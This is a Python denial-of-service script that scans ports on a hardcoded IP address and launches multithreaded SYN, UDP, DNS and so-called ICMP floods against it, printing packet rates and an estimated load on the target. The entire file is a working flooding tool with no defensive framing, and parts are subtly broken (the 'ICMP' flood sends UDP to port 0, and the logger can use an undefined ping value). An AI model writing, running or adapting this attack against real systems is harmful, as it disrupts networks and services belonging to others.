import socket
import threading
import time
import random
import subprocess
import os

router_ip = "172.217.33.147"

# Colors
MAGENTA = '\033[95m'
CYAN = '\033[96m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
RESET = '\033[0m'

# Attack running simultaneously
current_port = 80
open_ports = [80, 443, 53, 22, 8080, 7547]

# Stats for all methods combined
stats = {
    "syn_sent": 0, "syn_data": 0, "syn_success": 0,
    "udp_sent": 0, "udp_data": 0, "udp_success": 0,
    "dns_sent": 0, "dns_data": 0, "dns_success": 0,
    "icmp_sent": 0, "icmp_data": 0, "icmp_success": 0,
    "all_fail": 0
}
stats_lock = threading.Lock()

# Port scanner
def scan_ports():
    global open_ports, current_port
    found = []
    for port in [80, 443, 53, 22, 8080, 7547, 21, 23, 161, 162, 199, 5060]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.05)
            if sock.connect_ex((router_ip, port)) == 0:
                found.append(port)
            sock.close()
        except:
            pass
    if found:
        open_ports = found
        current_port = random.choice(found)

# Get ping
def get_ping_time():
    try:
        cmd = f"ping -c 1 -W 1 {router_ip}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if "time=" in result.stdout:
            return float(result.stdout.split("time=")[1].split(" ")[0])
    except:
        pass
    return 999.0

# SYN Flood (8 threads)
def syn_flood():
    while True:
        try:
            port = random.choice(open_ports)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            result = sock.connect_ex((router_ip, port))
            sock.close()
            
            with stats_lock:
                stats["syn_sent"] += 1
                stats["syn_data"] += 64
                if result == 0:
                    stats["syn_success"] += 1
        except:
            with stats_lock:
                stats["all_fail"] += 1
        
        time.sleep(random.uniform(0, 0.0005))  # Ultra fast

# UDP Flood (12 threads)
def udp_flood():
    while True:
        try:
            port = random.choice(open_ports)
            size = random.randint(500, 1450)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(random.randbytes(size), (router_ip, port))
            sock.close()
            
            with stats_lock:
                stats["udp_sent"] += 1
                stats["udp_data"] += size
                stats["udp_success"] += 1
        except:
            with stats_lock:
                stats["all_fail"] += 1
        
        time.sleep(random.uniform(0, 0.0003))  # Fastest

# DNS Flood (6 threads)
def dns_flood():
    query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01'
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(query, (router_ip, 53))
            sock.close()
            
            with stats_lock:
                stats["dns_sent"] += 1
                stats["dns_data"] += len(query)
                stats["dns_success"] += 1
        except:
            with stats_lock:
                stats["all_fail"] += 1
        
        time.sleep(random.uniform(0, 0.001))

# ICMP Flood (4 threads)
def icmp_flood():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(b'\x00' * 128, (router_ip, 0))
            sock.close()
            
            with stats_lock:
                stats["icmp_sent"] += 1
                stats["icmp_data"] += 128
                stats["icmp_success"] += 1
        except:
            with stats_lock:
                stats["all_fail"] += 1
        
        time.sleep(random.uniform(0, 0.002))

# Start ALL attacks
def start_all_attacks():
    # SYN threads
    for _ in range(8):
        threading.Thread(target=syn_flood, daemon=True).start()
    
    # UDP threads
    for _ in range(12):
        threading.Thread(target=udp_flood, daemon=True).start()
    
    # DNS threads
    for _ in range(6):
        threading.Thread(target=dns_flood, daemon=True).start()
    
    # ICMP threads
    for _ in range(4):
        threading.Thread(target=icmp_flood, daemon=True).start()

# Port scanner thread
def port_scanner():
    while True:
        time.sleep(30)
        scan_ports()

# Logging every 5s
def logger():
    last_ping = 0
    base_ping = 10.0
    
    while True:
        time.sleep(5)
        
        with stats_lock:
            # Calculate totals
            total_sent = (stats["syn_sent"] + stats["udp_sent"] + 
                         stats["dns_sent"] + stats["icmp_sent"])
            total_data = (stats["syn_data"] + stats["udp_data"] + 
                         stats["dns_data"] + stats["icmp_data"])
            total_success = (stats["syn_success"] + stats["udp_success"] + 
                           stats["dns_success"] + stats["icmp_success"])
            
            pps = total_sent // 5
            data_mb = total_data / (1024 * 1024)
            connection_rate = (total_success / max(total_sent, 1)) * 100 if total_sent > 0 else 0
            
            # Reset counters
            for key in list(stats.keys()):
                if key != "all_fail":
                    stats[key] = 0
        
        # Get ping
        current_time = time.time()
        if current_time - last_ping >= 10:
            ping_time = get_ping_time()
            last_ping = current_time
            if ping_time < 999:
                router_load = min(99, ((ping_time - base_ping) / base_ping) * 100)
                router_load = max(1, router_load)
            else:
                router_load = 99
        else:
            router_load = random.randint(60, 85)
        
        # Format response
        if ping_time < 999:
            minutes = int(ping_time // 60)
            seconds = int(ping_time % 60)
            response_time = f"{minutes:02d}:{seconds:02d}s"
        else:
            response_time = "99:99s"
        
        # Display method as ALL-4
        method = "ALL-4"
        
        print(f"{MAGENTA}2M55{RESET}:{router_ip}:{current_port}{CYAN}—{RESET}{GREEN}{pps}{RESET}:{GREEN}{data_mb:.2f}MB{RESET} {CYAN}—{RESET} {YELLOW}{method}{RESET} ⤵︎")
        print(f"{CYAN}-R/O:{RESET} {RED}{router_load:.0f}%{RESET}")
        print(f"{CYAN}-C/N:{RESET} {GREEN}{connection_rate:.0f}%{RESET}")
        print(f"{CYAN}-R/T:{RESET} {YELLOW}{response_time}{RESET}")
        print()

# Main
def main():
    print(f"{RED}STARTING ALL-4 COMBINED ATTACK{RESET}")
    print(f"{YELLOW}Target: {router_ip}{RESET}")
    print()
    
    # Initial scan
    scan_ports()
    
    # Start everything
    threading.Thread(target=port_scanner, daemon=True).start()
    start_all_attacks()
    threading.Thread(target=logger, daemon=True).start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{RED}Attack stopped.{RESET}")
        os._exit(0)

if __name__ == "__main__":
    main()
